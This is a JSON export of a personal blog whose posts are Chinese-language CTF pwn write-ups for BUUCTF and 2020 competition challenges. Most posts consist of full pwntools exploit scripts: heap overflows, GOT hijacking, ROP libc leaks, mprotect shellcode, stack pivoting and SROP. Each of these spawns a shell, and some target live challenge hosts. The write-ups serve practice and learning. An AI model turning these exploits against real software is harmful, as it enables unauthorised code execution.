{"meta":{"title":"summerN's blog","subtitle":"","description":"","author":"summerN","url":"http://summern.club","root":"/"},"pages":[{"title":"friends","date":"2019-12-16T10:41:52.000Z","updated":"2019-12-16T10:41:52.351Z","comments":true,"path":"friends/index.html","permalink":"http://summern.club/friends/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-12-16T10:41:58.000Z","updated":"2019-12-16T10:41:58.555Z","comments":true,"path":"categories/index.html","permalink":"http://summern.club/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-12-16T10:41:44.000Z","updated":"2019-12-16T10:41:44.254Z","comments":true,"path":"tags/index.html","permalink":"http://summern.club/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2019-12-16T10:41:24.000Z","updated":"2019-12-16T10:41:25.005Z","comments":true,"path":"about/index.html","permalink":"http://summern.club/about/index.html","excerpt":"","text":""}],"posts":[{"title":"2020高校战疫pwn","slug":"2020高校战疫pwn","date":"2020-03-11T15:59:58.486Z","updated":"2020-03-11T15:59:04.594Z","comments":true,"path":"2020/03/11/2020高校战疫pwn/","link":"","permalink":"http://summern.club/2020/03/11/2020%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%ABpwn/","excerpt":"","text":"2020高校战疫pwneasyheap1.此题目功能为：edit add free三个功能 2.保护状态，没有开启PIE保护，可以挟持got表内容 3.堆溢出状态：在free后第二次建立的chunk（即第三个chunk）内的地址指向堆的初始位置，可以通过edit功能实现堆溢出 思路1.通过堆溢出将free函数的got表内容覆盖为puts函数的plt地址，在执行free功能时即可执行put函数，同时，在之后的参数位置覆盖为puts的got表地址，泄露libc基地址 2.之后可以使用相同套路挟持free函数的got表为one-gadget（本地打不通） 3.或者通过泄露的libc基地址的到的system地址与binsh地址，来getshell，方式同泄露libc基地址方法相同 exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#_*_coding:utf-8_*_from pwn import *import base64local = 1context.log_level = \"debug\"context.terminal=['tmux','split','-h']if local: p = process(\"./easyheap\") elf = ELF(\"./easyheap\") libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote(\"121.36.209.145\",9997) elf = ELF(\"./easyheap\") libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')def add(size,data): p.recvuntil(\"Your choice:\\n\") p.sendline(\"1\") p.recvuntil(\"How long is this message?\\n\") p.sendline(str(size)) p.recvuntil(\"What is the content of the message?\\n\") p.send(data)def delete(index): p.recvuntil(\"Your choice:\\n\") p.sendline(\"2\") p.recvuntil(\"What is the index of the item to be deleted?\\n\") p.sendline(str(index)) def edit(index,content): p.recvuntil(\"Your choice:\\n\") p.sendline(\"3\") p.recvuntil(\"What is the index of the item to be modified?\\n\") p.sendline(str(index)) p.recvuntil(\"What is the content of the message?\\n\") p.send(content)free_got = elf.got[\"free\"]puts_got = elf.got[\"puts\"]puts_plt = elf.plt[\"puts\"]add(0x20,\"\\n\") #0add(0x80,\"\\n\") #1add(0x20,\"\\n\") #2#gdb.attach(p)delete(0)#gdb.attach(p)delete(1)#gdb.attach(p)p.recvuntil(\"Your choice:\\n\")p.sendline(\"1\")p.recvuntil(\"How long is this message?\\n\")p.sendline(str(1030)) #0 *struct #gdb.attach(p)add(0x20,\"\\n\")#1 #gdb.attach(p)#free_got = 0x602018payload = p64(0)+p64(0x21)+p64(free_got)+p64(0x20)+p64(0)+p64(0x31)+p64(0)*4payload += p64(0)+p64(0x21)+p64(puts_got)+p64(0x80)edit(0,payload+\"\\n\")#gdb.attach(p)edit(1,p64(puts_plt))#print puts_got#print puts_plt#gdb.attach(p)#pause()delete(0)puts_addr = u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,\"\\x00\"))#print hex(puts_addr)libc_base = puts_addr-libc.symbols[\"puts\"]print hex(libc_base)print hex(puts_got)# 0x45216 0x4526a 0xf02a4 0xf1147#gdb.attach(p)one_gadget = libc_base+0xf02a4sys = libc_base + libc.sym['system']edit(1,p64(sys))#gdb.attach(p)edit(2,'/bin/sh\\x00')delete(2)#gdb.attach(p)#payload = \"\"p.interactive()","categories":[],"tags":[]},{"title":"buuctf pwn","slug":"buuctf","date":"2020-02-12T16:00:00.000Z","updated":"2020-02-20T15:40:40.972Z","comments":true,"path":"2020/02/13/buuctf/","link":"","permalink":"http://summern.club/2020/02/13/buuctf/","excerpt":"1.测试nc","text":"1.测试nc nc 出结果 2简单的栈溢出 exp： 1234567891011#encoding=utf-8from pwn import *context(os='linux', arch='amd64', log_level='debug')#p = process(\"./pwn1\")p = remote(\"node3.buuoj.cn\",28852)p.recvuntil(\"please input\")payload = \"a\" * (0xf + 8)+ p64(0x401186)print payloadp.sendline(payload)p.interactive() 但是出现了问题，无法在远程无法打通参考文章 在一些64位的glibc的payload调用system函数失败问题 我们这里选择转移栈地址 由于text段中有call system 所以我们有两种exp的写法 现在在我看来这两个exp的主要区别在于 payload += p64(0x0000000000401191) 这一串payload 在第2个payload中，如果去掉上面那个，本地可以打通，但是远程无法打通，应该是因为堆栈没有对齐 但是我们加入了上面那一串后，那一串的地址为一个没有参数的函数，所以我们把system的地址放入了其返回地址处，如果有参数的话我们放入的system地址变为了参数，就无法调用system，暂时这样里理解 https://www.jianshu.com/p/4928e726a43f 1 这里我们使用的是text中的 123456789101112131415161718192021222324252627282930313233#!/usr/bin/python2#encoding:utf-8#__author__='pumpkin9@DL&amp;S'from pwn import *import sysfile_name = './pwn1'#libc_name = '/lib/x86_64-linux-gnu/libc.so.6'ip = 'node3.buuoj.cn'port = '28852'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)# p = process(file_name)p = remote(ip,int(port))bin_sh_addr=0x40201Bpop_rdi=0x4011fbpayload = 'A' * 23payload += p64(pop_rdi)payload += p64(bin_sh_addr)payload += p64(0x0000000000401191)#payload += p64(elf.symbols[\"system\"])# gdb.attach(p)p.sendline(payload)p.interactive() 2 这里使用的是elf.symbols获取的system地址 123456789101112131415161718192021222324252627282930313233#!/usr/bin/python2#encoding:utf-8#__author__='pumpkin9@DL&amp;S'from pwn import *import sysfile_name = './pwn1'#libc_name = '/lib/x86_64-linux-gnu/libc.so.6'ip = 'node3.buuoj.cn'port = '28852'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)# p = process(file_name)p = remote(ip,int(port))bin_sh_addr=0x40201Bpop_rdi=0x4011fbpayload = 'A' * 23payload += p64(pop_rdi)payload += p64(bin_sh_addr)payload += p64(0x0000000000401016)payload += p64(elf.symbols[\"system\"])# gdb.attach(p)p.sendline(payload)p.interactive() 3 warmup_csaw_2016sprintf()函数泄露了危险函数地址 简单的栈溢出漏洞 exp: 12345678910111213141516171819202122#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *ip = \"node3.buuoj.cn\"port = \"26985\"file_name = \"./1\"#p = process(file_name)p = remote(ip,port)print p.recvuntil(\"WOW:\")#print p.recvline()[0:-1].ljust(8,\"\\x00\")#print p.recvline()[0:-1]sys_add = int(p.recvline()[0:-1].ljust(8,\"\\x00\"),16)print sys_add#gdb.attach(p)p.recvuntil(\"&gt;\")payload = \"a\" * (0x40 + 8) + p64(sys_add)p.sendline(payload)print p.recvall() https://blog.csdn.net/yishizuofei/article/details/78195255sprintf函数 4.pwn1_sctf_2016https://www.runoob.com/cprogramming/c-function-fgets.html fget()函数 12345678910111213141516171819202122232425#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *import sysfile_name = './1'libc_name = '/lib/i386-linux-gnu/libc.so.6'ip = 'node3.buuoj.cn'port = '27432'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']libc = ELF(libc_name)elf = ELF(file_name)#p = process(file_name)p = remote(ip,port)backdoor = 0x08048F0Dpayload = \"I\" * 0x14 + \"a\" * 4 + p32(backdoor)#p.recvuntil(\"Tell me something about yourself: \")#p.sendline(payload)print p.recvall() 貌似p.recvuntil()无法接受到print打印的数据，，貌似 5 iscn_2019_c_1这个题的大致思路就是通过栈溢出漏洞将某个函数的got地址通过puts函数泄露出来从而获取libc的版本 获取libc版本后搜索system或者execve的地址与bin/sh从而获取shell 附上libcsearch的github https://github.com/lieanu/LibcSearcher exp: 先膜拜大佬pumpink9的exp 123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/python2#encoding:utf-8#__author__='pumpkin9@DL&amp;S'from pwn import *import sys# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']file_name = './ciscn_2019_c_1'libc_name = '../libc/18-libc64.so'ip = 'node3.buuoj.cn'port = '25405'debug = 0if(debug == 1): p = process(file_name) elf = ELF(file_name) libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")else: p = remote(ip,int(port)) elf = ELF(file_name) libc = ELF(\"../libc/18-libc64.so\")li = lambda name,x : log.info(name+':0x%x'%x)ls = lambda name,x : log.success(name+':0x%x'%x)ret = 0x00000000004006b9rdi_ret = 0x0000000000400c83main = 0x000000000400B28p.sendlineafter(\"choice!\\n\",\"1\")payload = \"a\"*(0x50+8)payload += p64(rdi_ret)+p64(elf.got['__libc_start_main'])+p64(elf.plt['puts'])+p64(main)p.sendlineafter(\"encrypted\\n\",(payload))p.recvuntil(\"@\\n\")addr = u64(p.recvuntil(\"\\n\",True).ljust(8,\"\\x00\"))ls(\"libc start main\",addr)libc.address = addr-libc.symbols['__libc_start_main']ls(\"libc addr\",libc.address)payload = \"a\"*0x58payload += p64(rdi_ret)+p64(libc.search(\"/bin/sh\\x00\").next())+p64(ret)+p64(libc.symbols['system'])p.sendlineafter(\"choice!\\n\",\"1\")p.sendlineafter(\"encrypted\\n\",(payload))p.interactive() 之后在上我本地能打通，远程打不通的exp（估计是因为libc不行） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './1'libc_name = ''ip = 'node3.buuoj.cn'port = '28653'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)p = process(file_name)#p = remote(ip,port)start = 0x400790put_plt = elf.plt['puts']put_got = elf.got['puts']pop_rdi = 0x400c83offset = 0x50print put_gotp.sendlineafter('Input your choice!',\"1\")payload1 = \"a\" * (offset + 8) + p64(pop_rdi) + p64(put_got) + p64(put_plt) + p64(start)p.recvuntil(\"Input your Plaintext to be encrypted\\n\")p.sendline(payload1)#gdb.attach(p)print p.recvuntil(\"@\\n\")add = u64(p.recvline().strip(\"\\n\").ljust(8,\"\\x00\"))#print add#print p.recvall()libc = LibcSearcher(\"puts\",hex(add))libc_add = add - libc.dump(\"puts\")print libc_addsys_add = libc_add + libc.dump(\"system\")bin_add = libc_add + libc.dump(\"str_bin_sh\")p.sendlineafter(\"Input your choice!\",\"1\")payload2 = \"a\" * (offset + 8) + p64(pop_rdi) + p64(bin_add) + p64(sys_add)p.recvuntil(\"Input your Plaintext to be encrypted\\n\")p.sendline(payload2)p.interactive() 6.[HarekazeCTF2019]baby_rop2有点小难受，第一次用printf泄露 exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = '1'libc_name = ''ip = 'node3.buuoj.cn'port = '29757'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)#p = process(file_name)p = remote(ip,port)main = 0x400636pop_rdi = 0x0000000000400733read_got = elf.got['read']#print_plt = elf.got['printf']printf_plt = 0x4004f0#print hex(print_plt)payload = 'a' * (0x20) + \"a\" * 8payload += p64(pop_rdi) + p64(read_got) + p64(printf_plt) + p64(main)p.recvuntil(\"What's your name?\")p.sendline(payload)p.recvline()read_add = u64(p.recv(6).strip(\"\\n\").ljust(8,\"\\x00\"))print hex(read_add)libc = LibcSearcher(\"read\",int(read_add))base_add = read_add - libc.dump(\"read\")sys_add = base_add + libc.dump(\"system\")str_bin_sh = base_add + libc.dump(\"str_bin_sh\")#print str_bin_shpayload2 = 'a' * (0x20) + 'a' * 8 + p64(pop_rdi) + p64(str_bin_sh) + p64(sys_add) + p64(main)p.sendline(payload2)p.interactive() 7.get_started_3dsctf_2016啥也不会，，涉及到内存修改的问题 第一个本地能打通的思路(远程打不了)123456789101112131415修改eip跳转到get_flag函即可,可是直接进行跳转到该函数,会存在一个过滤,把该地址给过滤掉了,其实往后退几个指令就行在buuctf里远程打不了.外国大牛博客:http://www.infohelp.org下面是本地能打的exp,(前提是你自己创建了一个flag.txt文件)from pwn import *context.log_level = 'debug'elf = ELF('./get_started_3dsctf_2016')sh = elf.process()printf_addr = 0x0804F0E0main = 0x08048A20get_flag = 0x080489B8payload_01 = 'A' * 56 + p32(get_flag)sh.sendline(payload_01)sh.interactive() 第二个思路:(该方法能打远程)12345678910修改使用mprotec函数修改内存的权限为可读可写可执行,然后在该内存中写入自己的shellcode,执行该代码即可.首先按先说一下mprotect函数:原型如下int mprotect(void *addr, size_t len, int prot);addr 内存启始地址len 修改内存的长度prot 内存的权限要想达到内存可执行的目的,我们看一下哪个内存最好修改,使用edb-debuger查看,或$ .&#x2F; get_started_3dsctf_2016 &amp;$ cat &#x2F;proc&#x2F;[you_pid]&#x2F;maps 查看内存区域可以查看到,内存可读可写的地址为: 0x80EB000 ,所以我们对该内存进行增加一个权限 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# _*_ coding:utf-8 _*_from pwn import *elf = ELF('./get_started_3dsctf_2016')sh = elf.process()sh = remote('node3.buuoj.cn', 28576)pop3_ret = 0x804951D'''pop esipop edipop ebp'''mem_addr = 0x80EB000 #可读可写的内存,但不可执行mem_size = 0x1000 #通过调试出来的值mem_proc = 0x7 #可代表可读可写可执行mprotect_addr = elf.symbols['mprotect']read_addr = elf.symbols['read']'''为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.'''payload_01 = 'A' * 0x38payload_01 += p32(mprotect_addr)payload_01 += p32(pop3_ret) #执行完mprotect的返回地址,使esp往下+12#mprotect 的三个参数payload_01 += p32(mem_addr) #mprotect函数参数1 修改的内存地址payload_01 += p32(mem_size) #mprotect函数参数2 修改的内存大小payload_01 += p32(mem_proc) #mprotect函数参数3 修改的权限payload_01 += p32(read_addr) #执行完pop3_ret后弹到read地址payload_01 += p32(pop3_ret) #执行完read后将返回到pop3_ret指令,又继续使esp+12#read 的三个参数payload_01 += p32(0) #read函数参数1 ,从输入端读取payload_01 += p32(mem_addr) #读取到的内容复制到指向的内存里payload_01 += p32(0x100) #读取大小payload_01 += p32(mem_addr) #执行完read后ret esish.sendline(payload_01)payload_sh = asm(shellcraft.sh(),arch = 'i386', os = 'linux') sh.sendline(payload_sh)sh.interactive() 8.not_the_same_3dsctf_2016同上一个题，只是数据换了一下，注意偏移 exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *elf = ELF('./1')sh = elf.process()sh = remote('node3.buuoj.cn',27353)pop3_ret = 0x0806fcf0'''pop esipop edipop ebp'''mem_addr = 0x80EB000 #可读可写的内存,但不可执行mem_size = 0x1000 #通过调试出来的值mem_proc = 0x7 #可代表可读可写可执行mprotect_addr = elf.symbols['mprotect']read_addr = elf.symbols['read']'''为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.'''payload_01 = 'A' * (0x2d)payload_01 += p32(mprotect_addr)payload_01 += p32(pop3_ret) #执行完mprotect的返回地址,使esp往下+12#mprotect 的三个参数payload_01 += p32(mem_addr) #mprotect函数参数1 修改的内存地址payload_01 += p32(mem_size) #mprotect函数参数2 修改的内存大小payload_01 += p32(mem_proc) #mprotect函数参数3 修改的权限payload_01 += p32(read_addr) #执行完pop3_ret后弹到read地址payload_01 += p32(pop3_ret) #执行完read后将返回到pop3_ret指令,又继续使esp+12#read 的三个参数payload_01 += p32(0) #read函数参数1 ,从输入端读取payload_01 += p32(mem_addr) #读取到的内容复制到指向的内存里payload_01 += p32(0x100) #读取大小payload_01 += p32(mem_addr) #执行完read后ret esish.sendline(payload_01)payload_sh = asm(shellcraft.sh(),arch = 'i386', os = 'linux') sh.sendline(payload_sh)sh.interactive() 9.ez_pz_hackover_2016此题位ret2shellcode 但是不知道为真么无法调用s所在栈的shellcode 只能利用copy进去的覆盖了s之前的内容的shellcode 为两个参数加ret加ebp加三个参数共7*4=0x1c 指向stack_addr-0x1c这里才可，但是为啥s的栈不行呢， 1234567891011121314151617181920212223242526from pwn import *p = process('./pwn')#p = remote('node3.buuoj.cn',27543)p.recvuntil(\"Yippie, lets crash: 0x\")stack_addr=int(p.recv(8),16)print hex(stack_addr)p.recvuntil(\"&gt; \")shellcode=asm(shellcraft.sh())payload=\"crashme\\x00\"+'a'*18+p32(stack_addr-0x1c)+shellcode#gdb.attach(p,\"b *0x8048601\")p.sendline(payload)#gdb.attach(p,\"b *0x80485f8\")p.interactive() 10.ciscn_2019_es_232位程序，开了NX保护（堆栈不可执行） 看程序可以发现存在两次写入以及printf 我们发现有个hack函数。但是溢出后发现并不能获取flag 因此我们可以写入shell 但同时，我们发现我们能输入的字符数量不多 因此我们可以利用栈迁移来进行getshell 先补充知识点：栈迁移https://blog.csdn.net/zszcr/article/details/79841848 可以根据这篇博客学习怎样使用栈迁移以及他的重复循环利用方法 总之： 1.使用leave_ret 栈迁移主要是为了解决可溢出空间大小不足的问题 原理：覆盖ebp为fake_ebp，然后利用leavel ; ret ; 把esp劫持到fake_ebp上去 leave ret相当于 123456789mov $esp, $ebp; 用ebp的值写入esppop $ebppop $eip 2.模板 payload=’a’ * 4或者8或者要迁移目标的ebp/rbp地址 + ret（想要执行的函数）+leave_ret + 参数参数…以此类推 若想重复挟持可以使用read函数，详见上面的网址 本题： 1.我们先使用printf泄露我们的ebp 2.ebp即为我们的栈地址，可以通过调试获取esp相对于栈地址的偏移，也可以自己想，， 3.构造payload，因为题目中有system，所以不用泄露libc地址 直接栈向前迁移，然后调用system执行我们写入的/bin/sh即可 具体解释在exp中 exp： 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *p=process('./pwn2')#sys_plt=0x8048400 sys_add=0x8048559payload='a'*0x20+'bbbbbbbb'p.send(payload)p.recvuntil('b'*8)ebp=u32(p.recv(4))print(hex(ebp))#payload2=('a'*8+p32(ebp-0x24)+'bbbb'+p32(sys_plt)+'cccc'+p32(ebp-0x1c)+'/bin/sh\\x00').ljust(0x28,'p')+p32(ebp-0x2c)#这里我们使用的是sys_pltpayload2=('a'*8+p32(ebp-0x24)+'bbbb'+p32(sys_add)+p32(ebp-0x20)+'/bin/sh\\x00').ljust(0x28,'p')+p32(ebp-0x2c)#这里我们使用的是程序自带的指令call system#我们来看这个payload，我们将ebp覆盖为ebp-0x2c，（偏移根据调试得到的），就将栈向前到了bbbb之前，#bbbb就是新的ebp，ret就是sys_add,（这里不需要构造返回地址），然后参数为ebp-0x1c处的字符串，即为我们的#/bin/sh，成功getshell#注意：#这里的原来的栈的ret没有覆盖为leave_ret的原因是本来就是leave_retgdb.attach(p,\"b *0x80485fc\")p.send(payload2)p.interactive() 完成，撒花=、= 11.2017 0ctf babyheap方法一： 1，使用unsort bin修露libc 2.使用malloc_hook与one gadget getshell 方法二： 1.通过堆块重叠泄露libc基地址 2.使用malloc_hook与one gadget getshell 参考博客： https://blog.csdn.net/qq_29343201/article/details/66476135 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './pwn'libc_name = '/lib/x86_64-linux-gnu/libc.so.6'#ip = ''#port = ''context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']libc = ELF(libc_name)elf = ELF(file_name)p = process(file_name)def create(size): p.recvuntil('Command: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size))def fill(index,content): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(len(content))) p.recvuntil('Content: ') p.send(content)def free(index): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index))def dump(index): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index))#leek libccreate(0x10)#index=0create(0x10)#index=1create(0x10)#index=2create(0x10)#index=3create(0x80)#index=4free(1)free(2)payload1 = p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21) + p8(0x80)fill(0,payload1)payload2 = p64(0) * 3 + p64(0x21)fill(3,payload2)create(0x10)create(0x10)payload3 = p64(0) * 3 + p64(0x91)fill(3,payload3)create(0x80)#这里是为了防止top chunk合并free的small bin（index=4）free(4)#gdb.attach(p)dump(2)p.recvuntil('Content: ')#p.recvuntil('\\x00' * 0x)main_arena = u64(p.recv(8).strip('\\n').ljust(8,'\\x00'))log.info(\"main_arena: \"+hex(main_arena))#gdb.attach(p)offset = 0x7fffff3f4b78 - 88 - 0x7fffff030000log.info(\"offset: \"+hex(offset))libc_base = main_arena - 88 -offsetlog.success(\"libc_base: \"+hex(libc_base))malloc_hook = libc_base + libc.symbols['__malloc_hook']log.info(\"malloc_hook: \"+hex(malloc_hook))one_gadget = libc_base + 0x4526aprint hex(one_gadget)#getshellcreate(0x60)free(4)#gdb.attach(p)payload4 = p64(malloc_hook-0x23)fill(2,payload4)#gdb.attach(p)create(0x60)#gdb.attach(p)create(0x60)#这里是我们的malloc_hook#gdb.attach(p)payload4 = p8(0)*3 + p64(0) * 2 + p64(one_gadget)fill(6,payload4)#gdb.attach(p)create(0x50)#getshellp.interactive() 12.铁人三项第五赛区 rop注意32位程序调用函数时要构造返回地址，有时还需要注意堆栈平衡 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './2'#libc_name = ''ip = 'node3.buuoj.cn'port = '29633'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)p = remote(ip,port)write_plt = elf.plt['write']libc_start_main_add = elf.got['__libc_start_main']main_add = 0x80484c6payload = 'a' * 0x88 + 'aaaa' + p32(write_plt) +p32(main_add) + p32(1) + p32(libc_start_main_add) + p32(4)p.sendline(payload)libc_start = u32(p.recv(4).strip('\\n').ljust(4,'\\x00'))log.success(\"libc_start: \"+hex(libc_start))libc=LibcSearcher('__libc_start_main',int(libc_start))libc_base = libc_start - libc.dump('__libc_start_main')sys_add = libc_base + libc.dump('system')bin_sh_add = libc_base + libc.dump('str_bin_sh')log.success(\"libc_base: \"+hex(libc_base))log.success(\"system_add: \"+hex(sys_add))log.success(\"bin_sh_add: \"+hex(bin_sh_add))payload2 = 'a' * 0x88 + 'aaaa' + p32(sys_add)+ p32(main_add) + p32(bin_sh_add)p.sendline(payload2)p.interactive() 13.buu 0ctf2016 fheap步骤：1.利用堆溢出与短字节覆盖教free所在函数的地址变为put函数，获得程序的基地址 2.利用同样的方法更改为printf函数，构造格式化字符串漏洞 3.根据格式化字符串获取libc基地址 4.同样利用堆溢出漏洞getshell 这道题漏洞好利用，主要是这个调试太恶心，不过也可以锻炼一下动态调试的水平 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './fuck'#libc_name = ''ip = 'node3.buuoj.cn'port = '27016'context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)#p = process(file_name)p = remote(ip,port)def create(size,content): p.recvuntil('quit\\n') p.sendline('create string') p.recvuntil('Pls give string size:') p.sendline(str(size)) p.recvuntil('str:') p.send(content.ljust(size,'\\x00')) #p.recvuntil('\\n')def delete(index): p.recvuntil('quit\\n') p.sendline('delete string') p.recvuntil('id:') p.sendline(str(index)) p.recvuntil('sure?:') p.sendline('yes')#pass PIEcreate(10,'aaa')create(10,'bbb')delete(1)delete(0)payload1 = 'a' * 24 + p8(0x1A) #短字节覆盖，将free_ptr变为puts，free时输出本地地址，求得基地址create(len(payload1),payload1)delete(1)p.recvuntil('a' * 24)PIE_1 = u64(p.recvline()[:-1].ljust(8,'\\x00'))#由于puts会00截断所以可以多试几次log.success(\"PIE_1: \"+hex(PIE_1))num_base = PIE_1 - 0xd1A #这里刚开始我写的是0x1A,好吧，我是二傻子log.success(\"num_base: \"+hex(num_base))#leak libcdelete(0)#这里同时free掉了两个堆pri_add = num_base + elf.plt['printf']log.info(\"pri_add: \"+hex(pri_add))part0 = 'aaaa%'+str(21)+'$llp'part0 = part0.ljust(24,'C')payload2 = part0 + p64(pri_add)create(32,payload2)#gdb.attach(p,\"b *printf\") #在获取偏移时，断点下在printf处，gdb在这里，就可以进入printf函数，获取栈的情况delete(1)#get:0x7ffff6c95d08#_IO_file_write+143:0x7ffff6c95d58#offset =11+10 (10=(0x7ffff6c95d58-0x7ffff6c95d08)/8) 这里是根据调试得到的结果，计算方法p.recvuntil('aaaa')_IO_file_write =int(p.recvuntil('C')[:-1],16) - 143log.success(\"_IO_file_write:\" +hex(_IO_file_write))libc=LibcSearcher(\"_IO_file_write\",_IO_file_write)libc_base = _IO_file_write - libc.dump('_IO_file_write')sys_add = libc_base + libc.dump('system')bin_add = libc_base + libc.dump('str_bin_sh')#getshelldelete(0)payload3 = '/bin/sh;'.ljust(24, 'A')+ p64(sys_add) #这里不知道为啥不能用地址create(32,payload3)delete(1)p.interactive() 14、ciscn_2019_es_764位程序，只有系统调用存在，有signturn的后门，即存在使eax赋值的指令 具体解释在exp中： 123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './1'libc_name = ''ip = 'node3.buuoj.cn'port = '25359'context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)#p = process(file_name)p = remote(ip,port)read_add =0x4004f1start_add =0x4004edsyscall_add =0x400517signturn_back =0x4004DApayload = '/bin/sh'+\"\\x00\"*9+ p64(read_add)#调用完vuln函数后回到调用read处#gdb.attach(p)p.send(payload)#gdb.attach(p)p.recv(32)stack_add=u64(p.recv(8))log.success(\"stack_add:\" +hex(stack_add))#这里获取的是main主函数的栈地址，从汇编上可以看到，在调用 vuln函数之前值push了rbp #因此ret地址后面的就为rbp(rbp存放着栈地址)p.recv(8)#从汇编上看write函数只是打印了0x30个字符，所以这是最后8个#构造sropsigframe = SigreturnFrame()#这里是pwntools集成的堆srop的应用sigframe.rax = constants.SYS_execvesigframe.rdi = stack_add - 280 # \"/bin/sh\" 's addr #通过调试计算得到sigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addsigframe.rip = syscall_addpayload1 = '/bin/sh/' + '\\x00' * 8 + p64(signturn_back) + p64(syscall_add) + str(sigframe)#这里我有点地方不懂，经过调试但就是这样，如果字符串填满后，我们的signturn_back的低两字节就会为00，相当于我们传入的地址往前移动了两位，地址错误，无法getshell，具体是为啥我也不知道#这里之所以是'\\x00' * 8 而不是多加个8，是因为，汇编：rsi, [rsp+buf] 这个buf是固定的相对于rbp位置的偏移，因此输入的地方少了8个字符p.send(payload1)p.interactive() 15.picoctf_2018_rop chain注意观察flag函数 存在参数的操作 exp: 12345678910111213141516#encoding = utf-8from pwn import *ip = 'node3.buuoj.cn'port = '27267'file_name = './1'p = remote(ip,port)#p = process(file_name)flag_add = 0x804862bwin1_add = 0x80485cbwin2_add = 0x80485d8win2_num = 0xBAAAAAADflag_num = 0xDEADBAADpayload = 'a' * (0x18+4) + p32(win1_add) + p32(win2_add) + p32(flag_add) + p32(win2_num) + p32(flag_num)p.recvuntil('Enter your input&gt; ')p.send(payload)p.interactive() 16.bjdctf_2020_babyrop很简单的rop 但是不知道问什么ret2__libc_csu_init不管用，回不到主函数，还是太菜了 这里使用最常用的rop 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './1'#libc_name = ''ip = 'node3.buuoj.cn'port = '26097'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)#p = process(file_name)p = remote(ip,port) csu_end_addr = 0x000000000040072Acsu_front_addr = 0x400710main_add = 0x4006ADoffset = 0x20 + 8bss_add = elf.bss()puts_got = elf.plt['puts']#write_add = elf.got['write']pop_rdi = 0x0000000000400733libc_start_add = elf.got['__libc_start_main']'''def csu(rbx, rbp, r12, r13, r14, r15,last): #这里的r13 r14 r15 分别为第三 第二 第一个参数 # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = 'a' * offset payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += 'a' * 0x38 #此时的r12应为被调用函数的got表地址 payload += p64(last) p.send(payload) sleep(1)p.recvuntil('Pull up your sword and tell me u story!\\n')csu(0,1,puts_got,0,0,libc_start_add,main_add)'''#p.recvall()payload = 'a' * offset + p64(pop_rdi) + 